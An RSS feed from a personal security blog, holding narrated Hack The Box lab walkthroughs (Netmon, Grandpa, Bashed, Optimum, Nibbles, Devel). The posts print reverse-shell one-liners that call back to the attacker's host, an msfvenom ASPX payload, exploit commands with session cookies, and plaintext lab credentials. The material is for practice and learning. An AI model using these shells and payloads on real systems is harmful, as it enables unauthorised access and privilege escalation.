<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Wook&#39;s blog</title>
    <link>http://localhost:1313/</link>
    <description>Recent content on Wook&#39;s blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <managingEditor>leewookb@gmail.com (Wook Lee)</managingEditor>
    <webMaster>leewookb@gmail.com (Wook Lee)</webMaster>
    <lastBuildDate>Mon, 12 Aug 2024 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>[HTB] Netmon</title>
      <link>http://localhost:1313/htb-netmon/</link>
      <pubDate>Mon, 12 Aug 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-netmon/</guid>
      <description>As usual, I started with an nmap scan. There were a lot of open ports, but what immediately caught my eye was the FTP server. From the screenshot above, you can see that the Anonymous FTP login was allowed, and it appeared that the C drive directory accessible, which I could potentially get a lot of important information from.
As expected, I was able to obtain the user flag immediately after accessing the FTP server.</description>
      <content:encoded><![CDATA[<p><img src="image.png#center" alt="alt text"></p>
<p>As usual, I started with an <strong><em>nmap</em></strong> scan. There were a lot of open ports, but what immediately caught my eye was the <strong><em>FTP</em></strong> server. From the screenshot above, you can see that the <strong><em>Anonymous FTP login</em></strong> was allowed, and it appeared that the C drive directory accessible, which I could potentially get a lot of important information from.</p>
<br>
<p><img src="image-1.png#center" alt="alt text">
As expected, I was able to obtain the user flag immediately after accessing the FTP server.</p>
<br>
<p><img src="image-2.png#center" alt="alt text">
Got the user flag.</p>
<br>
<p><img src="image-3.png#center" alt="alt text">
I navigated to the web page of the target address and it&rsquo;s titled <strong>PRTG Network Monitor</strong>.</p>
<br>
<p><img src="image-4.png#center" alt="alt text">
I googled <strong>&ldquo;PRTG Network Monitor default credentials&rdquo;</strong> and found the credentials above, <strong>prtgadmin:prtgadmin</strong>. However, they did not work.</p>
<br>
<p><img src="image-5.png#center" alt="alt text">
Also googled <strong>&ldquo;PRTG Network Monitor exploit&rdquo;</strong> and found the exploit above. But as you can see, it requires <strong>authenticated</strong> meaning I had to find the password first in order to run the exploit.</p>
<br>
<p><img src="image-7.png#center" alt="alt text">
While I was researching about the <strong>PRTG Network Monitor</strong> I found an interesting information about where it stores its data. The path of the default data folder is the following: <code>%programdata%\Paessler\PRTG Network Monitor</code>.</p>
<br>
<p><img src="image-6.png#center" alt="alt text">
I <strong>cd</strong> into the location path as learned and I found 3 <strong>PRTG Configuration</strong> files. Downloaded all of the 3 files using the command <code>get</code>.</p>
<br>
<p><img src="image-8.png#center" alt="alt text"></p>
<br>
<p><img src="image-9.png#center" alt="alt text">
The command <strong>md5sum</strong> returned that the hash of the first two files are identical meaning the contents inside those files are exactly the same. So I just needed to check either of the files and the <strong>PRTG Configuration.old.bak</strong> file.</p>
<br>
<p><img src="image-10.png#center" alt="alt text">
Inside the first file I checked, the password was encrypted.</p>
<br>
<p><img src="image-11.png#center" alt="alt text">
Inside the <strong>PRTG Configuration.old.bak</strong> file, I found the credentials.</p>
<p><strong>Username: prtgadmin</strong>, <strong>Password: PrTg@dmin2018</strong></p>
<br>
<p><img src="image-12.png#center" alt="alt text">
Navigated back to the webpage to confirm if the credentials that I obtained actually work, and they did.</p>
<br>
<p><img src="image-13.png#center" alt="alt text">
Under the exploit-db page that I found earlier, there was this piece of information that instructed me to obtain the <strong>cookie</strong> info use it with the script and it will create a new user <strong>&lsquo;pentest&rsquo;</strong> in the administrators group with the password &lsquo;<strong>P3nT3st!</strong>&rsquo;.</p>
<br>
<p><img src="image-14.png#center" alt="alt text">
I powered on the <strong><em>burpsuite</em></strong> to intercept the traffic and get the cookie information.</p>
<br>
<p><img src="image-16.png#center" alt="alt text"></p>
<p><code>./prtg-exploit.sh -u http://10.10.10.152 -c &quot;_ga=GA1.4.620613745.1723521193; _gid=GA1.4.536926311.1723521193; OCTOPUS1813713946=ezYyRkZGRkIyLTg4MTYtNEU1NC1BQ0U3LTQ1MjdCRUY1QzI1QX0%3D; _gat=1&quot;</code></p>
<p>Once I grabbed the cookie information, I replaced the placeholder and ran the above script.</p>
<br>
<p><img src="image-17.png#center" alt="alt text">
The exploit successfully created new user <strong>&lsquo;pentest&rsquo;</strong> with password <strong>&lsquo;P3nT3st!&rsquo;</strong> just as expected!</p>
<br>
<p><img src="image-18.png#center" alt="alt text">
I could have used the <strong>msfconsole</strong> for getting the shell but I wanted to practice another way around and I learned about <strong><em>Impacket</em></strong>. It is a collection of Python classes for working with network protocols and of course used by pentesters.</p>
<br>
<p><img src="image-20.png#center" alt="alt text">
Installed the <strong><em>impacket-scripts</em></strong> to use <strong>psexec.py</strong> file. The <strong><em>psexec.py</em></strong> is often used during penestration tests to gain remote command execution on target systems once valid credentials are obtained. It can also help in lateral movement within a network by allowing attackers to execute commands on multiple machines using stolen or cracked credentials.</p>
<br>
<p><img src="image-19.png#center" alt="alt text">
<strong>psexec.py</strong> script with the obtained credentials got me the root administrator shell.</p>
<br>
<p><img src="image-21.png#center" alt="alt text">
Got the root flag!</p>
<br>
<p><img src="image-22.png#center" alt="alt text"></p>
<br>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Grandpa</title>
      <link>http://localhost:1313/htb-grandpa/</link>
      <pubDate>Sat, 10 Aug 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-grandpa/</guid>
      <description>nmap scan result shows that there is one open port, which is the port 80 and the version it&amp;rsquo;s running is is Microsoft IIS httpd 6.0.
Nothing interesting on the web page of the target ip address.
I searched for a known exploit of the Microsoft IIS 6.0 version with Searchsploit.
CVE-2017-7269, also known as the ScStoragePathFromUrl exploit seemed like a good choice in this case. Under its description it said it allowes remote attackers to execute arbitrary code.</description>
      <content:encoded><![CDATA[<p><img src="image-1.png#center" alt="alt text">
<strong><em>nmap</em></strong> scan result shows that there is one open port, which is the port <strong>80</strong> and the version it&rsquo;s running is is <strong><em>Microsoft IIS httpd 6.0</em></strong>.</p>
<br>
<p><img src="image.png#center" alt="alt text">
Nothing interesting on the web page of the target ip address.</p>
<br>
<p><img src="image-2.png#center" alt="alt text">
I searched for a known exploit of the <strong><em>Microsoft IIS 6.0</em></strong> version with <strong><em>Searchsploit</em></strong>.</p>
<br>
<p><img src="image-3.png#center" alt="alt text">
<strong><em>CVE-2017-7269</em></strong>, also known as the <strong><em>ScStoragePathFromUrl</em></strong> exploit seemed like a good choice in this case. Under its description it said it <strong><em>allowes remote attackers to execute arbitrary code</em></strong>. That&rsquo;s exactly what I was interested in.</p>
<br>
<p><img src="image-4.png#center" alt="alt text"></p>
<br>
<p><img src="image-5.png#center" alt="alt text">
looking up the CVE on the msfconsole.</p>
<br>
<p><img src="image-6.png#center" alt="alt text">
configuring the options of the exploit.</p>
<br>
<p><img src="image-7.png#center" alt="alt text">
The exploit successfully ran and I got the meterpreter shell.</p>
<br>
<p><img src="image-8.png#center" alt="alt text">
However, the current user&rsquo;s capability was very limited that I was not able to enumerate any information. Definitely in need for a <strong><em>privilege escalation</em></strong>.</p>
<br>
<p><img src="image-9.png#center" alt="alt text">
In previous machines, I remember using the <strong><em>local_exploit_suggester</em></strong> module located under <strong><em>post/multi/recon</em></strong> for post-exploitation.</p>
<br>
<p><img src="image-10.png#center" alt="alt text">
Out of the many exploits it returned, there were six <strong>potentially vulnerable</strong> exploits I could use. I decided to use the <strong><em>ms10_015_kitrap0d</em></strong> exploit because I had used it before.</p>
<br>
<p><img src="image-11.png#center" alt="alt text"></p>
<br>
<p><img src="image-12.png#center" alt="alt text">
Contrary to my expectations, the exploit did not work. The error kept returning <strong><em>&ldquo;Access is denied&rdquo;</em></strong>.</p>
<br>
<p><img src="image-13.png#center" alt="alt text">
Tried another exploit and the result was the same.</p>
<br>
<p><img src="image-14.png#center" alt="alt text">
Back to the meterpreter shell, I ran the <strong>ps</strong> command to see what processes are running on the target system. The current process that our <strong>meterpreter payload</strong> is running on is the <strong><em>rundll32.exe</em></strong> and its <strong>PID</strong> is 3724. As you could see from the screenshot above, the <strong><em>User</em></strong> column of the process is empty, meaning the payload has no idea who the user is.</p>
<p>In order to stabilize and properly run the post-exploit, I decided to migrate from the current process to another process which has the <strong><em>admin user</em></strong>.</p>
<br>
<p><img src="image-15.png#center" alt="alt text">
Migrated from the pid 3724 to 1880.</p>
<br>
<p><img src="image-16.png#center" alt="alt text">
After migrating to another process, I backgrounded the session again to carry out another attempt at privilege escalation. This time I used another exploit named <strong><em>ms14_070_tcpip_ioctl</em></strong>.</p>
<br>
<p><img src="image-17.png#center" alt="alt text">
Finally the exploitation was successful and all commands worked properly without error.</p>
<br>
<p><img src="image-18.png#center" alt="alt text">
got the user flag.</p>
<br>
<p><img src="image-19.png#center" alt="alt text">
got the root flag.</p>
<br>
<p><img src="image-20.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Bashed</title>
      <link>http://localhost:1313/htb-bashed/</link>
      <pubDate>Fri, 09 Aug 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-bashed/</guid>
      <description>nmap scan found that there is one open port, which is the port 80
Since it was a http server, I navigated to the web page of target ip address.
I didn&amp;rsquo;t find much interesting information on the web page, so I decided to gather more by using gobuster with the following command:
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,py,html,db,xml,sh,txt
gobuster found many interesting directories, but the directory, /dev caught my eye because it included this file phpbash.</description>
      <content:encoded><![CDATA[<p><img src="image.png#center" alt="alt text">
nmap scan found that there is one open port, which is the port 80</p>
<br>
<p><img src="image-1.png#center" alt="alt text">
Since it was a <strong><em>http</em></strong> server, I navigated to the web page of target ip address.</p>
<br>
<p><img src="image-2.png#center" alt="alt text">
I didn&rsquo;t find much interesting information on the web page, so I decided to gather more by using <strong><em>gobuster</em></strong> with the following command:</p>
<p><code>gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,py,html,db,xml,sh,txt</code></p>
<br>
<p><img src="image-3.png#center" alt="alt text">
<strong>gobuster</strong> found many interesting directories, but the directory, <strong><em>/dev</em></strong> caught my eye because it included this file <strong><em>phpbash.php</em></strong> where I could run some bash commands.</p>
<br>
<p><img src="image-4.png#center" alt="alt text">
obtaining the <strong><em>user flag</em></strong> wasn&rsquo;t that hard since I found the <strong><em>phpbash</em></strong>. I just had to navigate to the proper user directory.</p>
<br>
<p><img src="image-13.png#center" alt="alt text">
The problem was gaining the <strong><em>root</em></strong> user access. You guessed it. Time for <strong><em>privilege escalation</em></strong>.</p>
<br>
<p><code>python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.51&quot;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)'</code></p>
<p>The <strong><em>phpbash</em></strong> was very useful but it was very limited. Therefore, I decided to pop a <strong><em>reverse shell</em></strong> using the python command above.</p>
<br>
<p><img src="image-14.png#center" alt="alt text">
successfully popped the reverse shell.</p>
<br>
<p><img src="image-15.png#center" alt="alt text">
The <code>sudo -l</code> command display a list of commands you are allowed to run with <code>sudo</code>.</p>
<p><code>(scriptmanager : scriptmanager)</code> means the user can run <code>ALL</code> commands as the user, <strong><em>scriptmanager</em></strong>.</p>
<br>
<p><img src="image-16.png#center" alt="alt text">
after gaining the <code>scriptmanager</code> user shell by running <code>sudo -u scriptmanager /bin/bash</code> command, I explored the directories. I found a suspicious directory, <strong><em>/scripts</em></strong>, there were two files inside it. One is <strong>test.py</strong> and the other is <strong><em>test.txt</em></strong>. As you could see from the screenshot above, the former is owned by <strong><em>scriptmanager</em></strong> and the latter is owned by <strong><em>root</em></strong>.</p>
<p>The content of the <strong><em>test.py</em></strong> is a python program that writes into <strong><em>test.txt</em></strong> file. Also as you could see from the screenshot above, the date format of the <strong><em>test.txt</em></strong> file is a bit different from the <strong><em>test.py</em></strong> file.</p>
<br>
<p><img src="image-17.png#center" alt="alt text">
running another <code>ls -la</code> command confirmed that my suspicious was true. There exists a <strong><em>cronjob</em></strong> that is scheduled to execute the <strong><em>test.py</em></strong> file and write to the <strong><em>test.txt</em></strong> file.</p>
<p><strong><em>cronjob</em></strong> is a scheduled task in Unix-like operating systems that is executed automatically at specified intervals. It is widely used for automating repetitive tasks, such as system maintenance, backups, updates, or running scripts.</p>
<br>
<p><img src="image-31.png#center" alt="alt text">
Since I know there exists a cronjob that executes the <strong><em>test.py</em></strong> file, I can replace the file with a <strong><em>python reverse shell</em></strong> code with the same file name. The screenshot above is the code. It is the exact same code I previously had used except I changed the port to 2222 since I was already using the port 1234 to pop the original reverse shell.</p>
<br>
<p><img src="image-29.png#center" alt="alt text">
It&rsquo;s important not to forget to make the file executable.</p>
<br>
<p><img src="image-19.png#center" alt="alt text">
The command starts a simple http server in the directory where the command is executed. This means that any files in that directory will be accessible over HTTP.</p>
<br>
<p><img src="image-20.png#center" alt="alt text">
Back to the <strong>scriptmanager</strong> shell, I removed the original <strong><em>test.py</em></strong> file to replace it over with my file that contains the reverse shell code.</p>
<br>
<p><img src="image-30.png#center" alt="alt text">
Transferred the file over using the <code>wget</code> command.</p>
<br>
<p><img src="image-32.png#center" alt="alt text">
Within a minute (because the cronjob is set to run every minute), I was connected to the root shell and captured the root flag.</p>
<br>
<p><img src="image-33.png#center" alt="alt text"></p>
<br>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Optimum</title>
      <link>http://localhost:1313/htb-optimum/</link>
      <pubDate>Fri, 09 Aug 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-optimum/</guid>
      <description>This machine was pretty straightforward and much easier than I expected it to be. I truly feel like I have improved a lot in the past 2-3 weeks because 2 weeks ago, I definitely would&amp;rsquo;ve not been able to solve this machine by myself. I still have a lot of room to develop, and I found myself freezing and getting lost when it came to the privilege escalation stage. I definitely need to spend more time working on it.</description>
      <content:encoded><![CDATA[<div style="text-align: center"><img src="./giphy.gif"></div>
<p>This machine was pretty straightforward and much easier than I expected it to be. I truly feel like I have improved a lot in the past 2-3 weeks because 2 weeks ago, I definitely would&rsquo;ve not been able to solve this machine by myself. I still have a lot of room to develop, and I found myself freezing and getting lost when it came to the <strong><em>privilege escalation</em></strong> stage. I definitely need to spend more time working on it. Still, I think I deserve to be proud of myself for tackling this machine (almost) entirely on my own.</p>
<hr>
<p><img src="image.png#center" alt="alt text">
nmap scan showed that only 1 port open, which is the port 80 with the version of <strong><em>HttpFileServer httpd 2.3</em></strong></p>
<br>
<p><img src="image-1.png#center" alt="alt text">
navigated to the web of target ip address <strong><em>10.10.10.8</em></strong>.</p>
<br>
<p><img src="image-2.png#center" alt="alt text">
couldn&rsquo;t find anything juicy excpet when I clicked on the <strong><em>login</em></strong> button there was this pop-up asking for credentials.</p>
<br>
<p><img src="image-3.png#center" alt="alt text">
I searched on <strong><em>searchsploit</em></strong> to see if there is an exploit for <strong><em>Httpfileserver 2.3</em></strong> that I found through an nmap scan and there was one exploit titled <strong><em>Rejetto HttpFileserver 2.3.x - Remote Command Execution</em></strong>. RCE attack is exactly what I was hoping for.</p>
<br>
<p><img src="image-4.png#center" alt="alt text">
Since I knew there exists an exploit for the version that&rsquo;s running on the server, I moved on to <strong><em>metasploit</em></strong></p>
<br>
<p><img src="image-5.png#center" alt="alt text">
on the options page of the exploit, configured every required option including <strong>RHOSTS</strong>, <strong>RPORT</strong>, <strong>SRVHOST</strong>, <strong>SRVPORT</strong>, <strong>LHOST</strong>, and <strong>LPORT</strong>.</p>
<br>
<p><img src="image-6.png#center" alt="alt text">
successfully executed the exploit and gained access to the user shell.</p>
<br>
<p><img src="image-7.png#center" alt="alt text">
obtained the user flag.</p>
<br>
<p><img src="image-8.png#center" alt="alt text">
However with the current user privilege, I could not access the root user directory. It was time for privilege escalation to move up vertically.</p>
<br>
<p><img src="image-9.png#center" alt="alt text">
As I learned from the previous machines, searched for a <code>post/multi/recon</code> module and it returned 4 modules. The second module is the one I&rsquo;ve used before on a machine which explores the current compromised local session and suggests all the potential exploits.</p>
<p>The <strong>post/multi/recon</strong> represents a category of post-exploitation modules designed to perform reconnaissance tasks on compromised systems.</p>
<ul>
<li>
<p><strong><em>post</em></strong>: short for <strong><em>post-exploitation</em></strong>. These modules are used after gaining access to a target system. They help gather additional information or achieve specific tasks once the initial compromise has been made.</p>
</li>
<li>
<p><strong><em>multi</em></strong>: indicates that the module is applicable to multiple platforms or operating systems.</p>
</li>
<li>
<p><strong><em>recon</em></strong>: short for <strong><em>reconnaissance</em></strong>, these modules are used to collect information about the target system or network.</p>
</li>
</ul>
<br>
<p><img src="image-10.png#center" alt="alt text">
As you could see the module requires me to list a session I would like to use the exploit on. In my case, I listed the session that I previously obtained which had id 2.</p>
<br>
<p><img src="image-11.png#center" alt="alt text">
It outputted all the possible exploits I could run on the current backgrouned session and what I decided to use was named <code>exploit/windows/local/ms16_032_secondary_logon_handle_privesc</code>. As you could notice from its name, it is used for a <strong><em>privilege escalation</em></strong> exactly what I was looking for.</p>
<br>
<p><img src="image-12.png#center" alt="alt text">
successfully executed the exploit and gained the root shell! as you could see the <code>getuid</code> command returned <code>NT AUTHORITY\SYSTEM</code>, another name for root!</p>
<br>
<p><img src="image-13.png#center" alt="alt text">
Got the root flag :)</p>
<br>
<p><img src="image-14.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Nibbles</title>
      <link>http://localhost:1313/htb-nibbles/</link>
      <pubDate>Thu, 08 Aug 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-nibbles/</guid>
      <description>enumeration using nmap scan from the output of nmap scan I learned there were 2 open ports and the one I had to look into was the port 80. Navigated to the target address on firefox but the website didn&amp;rsquo;t have any juicy info except the plain text saying Hello world!. right clicked on the web page and viewed the source code without any expectation but there was this interesting comment.</description>
      <content:encoded><![CDATA[<h4 id="enumeration-using-nmap-scan">enumeration using nmap scan</h4>
<p>from the output of nmap scan I learned there were 2 open ports and the one I had to look into was the port 80.
<img src="image-29.png#center" alt="alt text"></p>
<br>
<p>Navigated to the target address on firefox but the website didn&rsquo;t have any juicy info except the plain text saying <strong><em>Hello world!</em></strong>.
<img src="image-30.png#center" alt="alt text"></p>
<br>
<p>right clicked on the web page and <strong><em>viewed the source code</em></strong> without any expectation but there was this interesting comment.
<img src="image-31.png#center" alt="alt text"></p>
<br>
<p>navigated to the <strong><em>/nibbleblog</em></strong> as the comment hinted
<img src="image-32.png#center" alt="alt text"></p>
<br>
<h4 id="more-information-gathering-with-_gobuster_">more information gathering with <strong><em>gobuster</em></strong></h4>
<p>while on the <strong><em>/nibbleblog</em></strong> web page, I could not find more useful info so I decided to run a <strong><em>gobuster</em></strong> on the website to gather more information.
<img src="image-33.png#center" alt="alt text"></p>
<br>
<p>The gobuster output showed many directories but the results were not satisfying. I knew there had to be more. So I ran another <strong><em>gobuster</em></strong> scan but this time I added the <strong>-x</strong> option to search for specific file extensions.</p>
<p>The <strong><em>/admin.php</em></strong> was the first result that caught my eye.</p>
<p><img src="image-34.png#center" alt="alt text"></p>
<br>
<p><strong><em>/nibbleblog/admin.php</em></strong></p>
<p><img src="image-35.png#center" alt="alt text"></p>
<br>
<p>I didn&rsquo;t have anything for the admin credentials until I found this <strong><em>user.xml</em></strong> file that&rsquo;s located in the following path:
<strong><em>/nibbleblog/content/private/users.xml</em></strong>
<img src="image-36.png#center" alt="alt text"></p>
<br>
<p>The title of the nibbleblog was <strong><em>nibbles</em></strong> so why not try that for the password? and it turned out that it was the password. I was skeptical of doing the guesswork for the password but later I refered to other people&rsquo;s write ups but all of them also did some guessworks to figure out the password. I guess it&rsquo;s an important part of the pentesting.</p>
<p><img src="image-37.png#center" alt="alt text"></p>
<br>
<p>a screenshot of the admin dashboard page
<img src="image-38.png#center" alt="alt text"></p>
<br>
<p>Under the <strong>/plugins</strong> directory, there was this <strong><em>my image</em></strong> page where I could upload a file to the server and I definitely knew I could use this for uploading a reverse shell payload as an exploitation.</p>
<p><img src="image-39.png#center" alt="alt text"></p>
<br>
<p>For the reverse shell payload, I downloaded the popular <strong><em>pentestmonkey</em></strong>&rsquo;s php-reverse-shell.
<img src="image-40.png#center" alt="alt text"></p>
<br>
<p><img src="image-41.png#center" alt="alt text"></p>
<br>
<p>After uploading the payload file I had to manually navigate to the following path to run it on the server.</p>
<p><strong><em>/nibbleblog/content/private/plugins/my_image</em></strong>
<img src="image-1.png#center" alt="alt text"></p>
<br>
<p><strong><em>netcat listener</em></strong> successfully captured the reverse shell.
<img src="image-2.png#center" alt="alt text"></p>
<br>
<p>got the user flag!</p>
<p>oh I almost forgot. As you could notice from the screenshot below, I upgraded the shell to the <strong><em>fully interactive TTY Shell</em></strong>.</p>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span><span style="color:#6c7086;font-style:italic">#reverse shell</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>python3 -c <span style="color:#a6e3a1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>ctrl + z <span style="color:#6c7086;font-style:italic"># background</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#6c7086;font-style:italic">#kali</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>stty raw -echo; <span style="color:#89dceb">fg</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>reset
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span><span style="color:#6c7086;font-style:italic">#reverse shell</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span><span style="color:#89dceb">export</span> <span style="color:#f5e0dc">SHELL</span><span style="color:#89dceb;font-weight:bold">=</span>bash
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span><span style="color:#89dceb">export</span> <span style="color:#f5e0dc">TERM</span><span style="color:#89dceb;font-weight:bold">=</span>xterm-256color</span></span></code></pre></div>
<hr>
<p><img src="image-3.png#center" alt="alt text"></p>
<br>
<p><strong><em>privilege escalation</em></strong></p>
<p>With the reverse shell, the current user, <strong>nibbler</strong> was not able to access the root directory. So I had to figure a way for privilege escalation. I ran the <code>sudo -l</code> command to list the commands I can actually run with the <strong>sudo</strong> and I could run the following</p>
<p><code>/home/nibbler/personal/stuff/monitor.sh</code></p>
<p><img src="image-4.png#center" alt="alt text"></p>
<br>
<p>This is the part where I needed some help. I couldn&rsquo;t figure out what it took me to write inside the <strong>monitor.sh</strong> file for privilege escalation so I refered to one of the walkthroughs online.</p>
<p><code>echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.10.14.15 1235 &gt;/tmp/f' &gt; /home/nibbler/personal/stuff/monitor.sh</code></p>
<br>
<p>After modifying the content inside the file, I pop opened another netcat listener with another port, 1235 because the port 1234 was already listening for the original reverse shell.</p>
<p><code>sudo /home/nibbler/personal/stuff/monitor.sh</code></p>
<br>
<p><strong>id</strong> command returned that I&rsquo;m the root user
<img src="image-5.png#center" alt="alt text"></p>
<br>
<p>successfully got the root flag
<img src="image-6.png#center" alt="alt text"></p>
<br>
<p><img src="image-7.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Devel</title>
      <link>http://localhost:1313/htb-devel/</link>
      <pubDate>Wed, 07 Aug 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-devel/</guid>
      <description>Scanning with nmap the nmap scan results show that ftp-anonymous login is allowed. I explored a directory but couldn&amp;rsquo;t find any useful info on the server. Because the http port 80 server is also open, I tried navigating to the address on Firefox. More information gathering Then I tried gathering more information which really did not help much and that made me realize there was an easier way to go about this.</description>
      <content:encoded><![CDATA[<h4 id="scanning-with-nmap">Scanning with nmap</h4>
<p>the nmap scan results show that <strong><em>ftp-anonymous</em></strong> login is allowed.
<img src="image.png#center" alt="alt text"></p>
<br>
<p>I explored a directory but couldn&rsquo;t find any useful info on the server.
<img src="image-1.png#center" alt="alt text"></p>
<br>
<p>Because the http port 80 server is also open, I tried navigating to the address on Firefox.
<img src="image-2.png#center" alt="alt text"></p>
<br>
<h4 id="more-information-gathering">More information gathering</h4>
<p>Then I tried gathering more information which really did not help much and that made me realize there was an easier way to go about this. Because the ftp server was open I could just generate a payload and run it on the webserver and pop the reverse shell.
<img src="image-3.png#center" alt="alt text"></p>
<p><img src="image-4.png#center" alt="alt text"></p>
<p><img src="image-5.png#center" alt="alt text"></p>
<br>
<h4 id="generating-a-payload">Generating a payload</h4>
<p>I generated a reverse shell payload with <strong><em>msfvenom</em></strong> and the extension is <strong><em>.asp</em></strong> since we saw the extension on the ftp server.</p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=1234 -f asp &gt; reverse.aspx</code></p>
<p><img src="image-6.png#center" alt="alt text"></p>
<br>
<p>uploaded the reverse shell that I generated onto the ftp server using the <strong><em>put</em></strong> command.</p>
<p><img src="image-7.png#center" alt="alt text"></p>
<br>
<p>Before navigating to <strong>http://10.10.10.5/reverse.aspx</strong>, I had to start a netcat server to listen to the port by running the following command:
<code>nc -lvnp 1234</code></p>
<br>
<p>For some reason, my netcat listener kept crashing. As an alternative, I switched to <strong><em>msfconsole</em></strong> and utilized <strong><em>multi/handler</em></strong> to listen ports.</p>
<p><img src="image-8.png#center" alt="alt text"></p>
<br>
<p><img src="image-9.png#center" alt="alt text"></p>
<br>
<p>I was able to get the shell but the user was not the admin with low privileges that I couldn&rsquo;t access many directories with the current user. As you could see from the picture below the <strong><em>getuid</em></strong> returned IIS APPPOOL\Web which is not the administrator. It was time to utilize the <strong><em>privilege escaltion</em></strong> to move vertically and gain access.</p>
<p><img src="image-10.png#center" alt="alt text"></p>
<br>
<p>After some research, I learned that there exists a post module in meterpreter. So I backgrouned the current session and searched for the module. <code>search type:post path:post/multi</code>.</p>
<p><img src="image-11.png#center" alt="alt text"></p>
<p><img src="image-12.png#center" alt="alt text"></p>
<br>
<p>As the name of the exploit (<strong><em>local_exploit_suggester</em></strong>) implies it suggested many available exploits and I decided to use the 3rd exploit, which is <strong>exploit/windows/local/ms10_015_kitrap0d</strong>.</p>
<p><img src="image-13.png#center" alt="alt text"></p>
<br>
<p>set the <strong><em>SESSION</em></strong> as 1, because the backgrouned session is the only session we have and set othe required options.</p>
<p><img src="image-14.png#center" alt="alt text"></p>
<br>
<p>I succeeded in getting the root shell. <strong><em>getuid</em></strong> command returned NT AUTHORITY\SYSTEM, another name for root.
<img src="image-15.png#center" alt="alt text"></p>
<br>
<p>found the user flag.
<img src="image-17.png#center" alt="alt text"></p>
<br>
<p>found the root flag.
<img src="image-16.png#center" alt="alt text"></p>
<br>
<p><img src="image-18.png#center" alt="alt text"></p>
]]></content:encoded>
    </item>
    <item>
      <title>[HTB] Jerry</title>
      <link>http://localhost:1313/htb-jerry/</link>
      <pubDate>Wed, 07 Aug 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/htb-jerry/</guid>
      <description>I was able to solve this box today on my own without relying on a walkthrough, following yesterday&amp;rsquo;s success with the box named Blue. I feel like the hard work that I have put in over the past couple of months is finally paying off. I am so happy :)
nmap scan directory busting with gobuster gobuster dir -u http://10.10.10.95:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.95:8080/docs http://10.10.10.95:8080/example http://10.10.10.95:8080/manager After few tries of default credentials, it automatically redirected me to manager/html page and the second line listed the username tomcat and the password s3cret so I tried the credentials, though I was skeptical.</description>
      <content:encoded><![CDATA[<div style="text-align: center"><img src="./200.gif"></div>
